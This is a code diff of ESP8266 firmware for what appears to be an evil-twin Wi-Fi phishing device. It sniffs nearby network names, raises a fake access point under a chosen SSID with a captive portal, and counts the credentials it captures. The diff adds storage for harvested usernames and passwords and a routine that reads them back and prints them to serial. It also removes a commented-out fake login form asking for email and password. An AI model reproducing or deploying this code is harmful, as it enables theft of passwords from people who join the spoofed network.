@@ -75,6 +75,16 @@ struct SSID SSIDlist[10];
 int SSIDcount = 0;
 int capturecount = 0;
 
+struct credentials{
+  char username[32];
+  char password[32];
+};
+
+int addr = 0;
+int previousCaptures = 0;
+
+struct credentials capturedCredentials[10];
+
 const int LEDpin = D0;
 
 int numberOfInterrupts = 0;
@@ -96,21 +106,6 @@ long timeOfLastModeSwitch = 0;
 //DNSServer dnsServer;
 //ESP8266WebServer webServer(80);
 
-/*String responseHTML = ""
-  "<!DOCTYPE html><html><head><title>CaptivePortal</title></head><body>"
-  "<section class='loginform cf'>"
-  "<form name='login' action='index_submit' method='get' accept-charset='utf-8'>"
-  "<ul>"
-  "<li><label for='usermail'>Email</label>"
-    "<input type='email' name='usermail' placeholder='yourname@email.com' required></li>"
-    "<li><label for='password'>Password</label>"
-    "<input type='password' name='password' placeholder='password' required></li>"
-    "<li>"
-    "<input type='submit' value='Login'></li>"
-  "</ul>"
-"</form>"
-"</section>"
-"</body></html>";*/
 
 static void showMetadata(SnifferPacket *snifferPacket) {
 
@@ -250,15 +245,6 @@ static String getMAC(char *addr, uint8_t* data, uint16_t offset) {
     }
 }*/
 
-/*static char* stringToChar(String s){
-    int buffer = 32; //s.length();
-    char array[buffer];
-    for(int i = 0; i <= buffer; i++){
-        array[i] = s[i];
-    }
-    return array;
-}*/
-
 String scan = "Scanning.";
 static void ICACHE_FLASH_ATTR displayScanning() {
   //int progress = (counter) % 100;
@@ -274,13 +260,13 @@ static void ICACHE_FLASH_ATTR displayScanning() {
 
   display.setTextAlignment(TEXT_ALIGN_LEFT);
 
-  if (progress%10 == 0){
+  /*if (progress%10 == 0){
     if(progress%30 == 0){
       scan.remove(9, 2);
     }else{
       scan += ".";
     }
-  }
+  }*/
   display.drawString(41, 5, scan);
 }
 
@@ -315,15 +301,12 @@ static void ICACHE_FLASH_ATTR displaySSIDs() {
   }
 }
 
-//int prog2 = 0;
 static void ICACHE_FLASH_ATTR displayAPsetup() {
+
   // draw the progress bar
-  //display.drawProgressBar(0, 32, 120, 10, progress);
-  //int progress = (counter*5) % 100;
   int progress = (((millis()-timeOfLastModeSwitch)*100)/2700);
   // draw the percentage as String
   display.setTextAlignment(TEXT_ALIGN_CENTER);
-  //display.drawString(64, 15, String(progress) + "%");
 
   display.drawString(64, 15, "Setting up");
   display.drawString(64, 30, SSIDlist[numberOfInterrupts2+1].name + " Access Point");
@@ -336,36 +319,11 @@ static void ICACHE_FLASH_ATTR displayAPsetup() {
 
 static void ICACHE_FLASH_ATTR displayKEYcapture(){
   display.setTextAlignment(TEXT_ALIGN_CENTER);
-  //display.drawString(64, 15, String(progress) + "%");
   display.drawString(64, 0, "Captive portal on");
   display.drawString(64, 15, SSIDlist[numberOfInterrupts2+1].name + " Access Point");
   display.drawString(64, 30, "Credentials Captured:");
   display.drawString(64, 45, String(capturecount));
 }
-
-/*static void captivePortal(){
-
-
-  wifi_set_opmode(WIFI_AP);
-  delay(10);
-  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-
-  delay(10);
-  char *ap = stringToChar(SSIDlist[numberOfInterrupts2+1].name);
-  WiFi.softAP(ap);
-  //Serial.println(WiFi.softAP(ap) ? "Ready" : "Failed!");
-  delay(10);
-  // if DNSServer is started with "*" for domain name, it will reply with
-  // provided IP to all DNS request
-  dnsServer.start(DNS_PORT, "*", apIP);
-  delay(10);
-  // replay to all requests with same HTML
-  webServer.onNotFound([]() {
-    webServer.send(200, "text/html", responseHTML);
-  });
-  webServer.begin();
-
-}*/
 
 /*static void ICACHE_FLASH_ATTR handleInterrupt() {
   interruptCounter++;
@@ -400,6 +358,7 @@ void setup() {
 
     //Start serial connection
     Serial.begin(115200);
+
     pinMode(LEDpin, OUTPUT);
     digitalWrite(LEDpin, HIGH);
     // setup interrupt pins
@@ -413,13 +372,11 @@ void setup() {
     //attachInterrupt(interrupt2Pin, handleInterrupt2, FALLING);
 
     // set the WiFi chip to "promiscuous" mode aka monitor mode
-    //delay(10);
+
     wifi_set_opmode(STATION_MODE);
     wifi_set_channel(1);
     wifi_promiscuous_enable(DISABLE);
-    //delay(10);
     wifi_set_promiscuous_rx_cb(sniffer_callback);
-    //delay(10);
     wifi_promiscuous_enable(ENABLE);
 
     // setup the channel hoping callback timer
@@ -431,6 +388,17 @@ void setup() {
     display.init();
     display.flipScreenVertically();
     display.setFont(ArialMT_Plain_10);
+
+    Serial.println();
+    Serial.println("Recovered credentials:");
+    int i = 0;
+    while(previousCaptures == 0 ){
+      loadCredentials(i);
+      Serial.println(capturedCredentials[i].username);
+      Serial.println(capturedCredentials[i].password);
+      Serial.println();
+      i++;
+    }
 }
 
 void loop() {
@@ -440,6 +408,7 @@ void loop() {
 
   // clear the display
   display.clear();
+
   // draw the current Screen method
   screens[screenState]();
 
@@ -478,26 +447,15 @@ void loop() {
       Serial.print("An interrupt has occurred. Total: ");
       Serial.println(numberOfInterrupts);
 
-      //delay(10);
-
       screenState = 2;
       timeOfLastModeSwitch = millis();
       counter = 0;
 
-      //delay(10);
-
       captiveSetup();
 
-      //delay(10);
-
-      //WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
       Serial.print("Setting AP for ");
       Serial.print(SSIDlist[numberOfInterrupts2+1].name);
       Serial.print("...");
-      /*char *ap = stringToChar(SSIDlist[numberOfInterrupts2+1].name, 32);
-      Serial.println(WiFi.softAP(ap) ? "Ready" : "Failed!");*/
-
-      //delay(10);
 
   }
 
@@ -510,17 +468,11 @@ void loop() {
 
   if(numberOfInterrupts > 0){
 
-      //Serial.printf("Stations connected = %d\n", WiFi.softAPgetStationNum());
-      //delay(10);
       captiveLoop();
-      /*dnsServer.processNextRequest();
-      delay(10);
-      webServer.handleClient();*/
-      //delay(3000);
+
   }
 
   counter++;
-  //delay(100);
   digitalWrite(LEDpin, HIGH);
 
 }
